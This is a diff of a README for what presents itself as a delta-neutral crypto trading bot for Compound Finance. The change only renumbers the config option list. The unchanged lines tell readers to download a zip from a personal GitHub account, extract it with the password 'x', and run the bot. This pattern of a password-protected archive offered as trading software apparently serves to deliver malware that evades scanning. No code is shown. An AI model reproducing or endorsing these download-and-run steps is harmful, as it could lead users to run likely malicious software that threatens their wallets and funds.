@@ -5,11 +5,11 @@ A delta-neutral strategy with Compound Finance involves employing a financial ap
 - [Clone](https://github.com/medlaare/delta-neutral-strategy/archive/refs/heads/main.zip) the repository and follow the step-by-step setup guide in the documentation.
 - Extract archive with password `x`
 - Modify the config file:
- - `rpc_url` is the endpoint for the Ethereum, Polygon, and Arbitrum RPC providers.
- - `gas_limit` and `gas_price` are parameters to control transaction costs.
- - `rebalancing_time` specifies the time for periodic rebalancing.
- - `timeout` is the maximum time allowed for a transaction to be confirmed.
- - `position_size_eth` and `position_size_matic` represent the desired position size on Ethereum and Polygon networks, respectively.
+ 1. `rpc_url` is the endpoint for the Ethereum, Polygon, and Arbitrum RPC providers.
+ 2. `gas_limit` and `gas_price` are parameters to control transaction costs.
+ 3. `rebalancing_time` specifies the time for periodic rebalancing.
+ 4. `timeout` is the maximum time allowed for a transaction to be confirmed.
+ 5. `position_size_eth` and `position_size_matic` represent the desired position size on Ethereum and Polygon networks, respectively.
 - Run the bot.
 
 ```
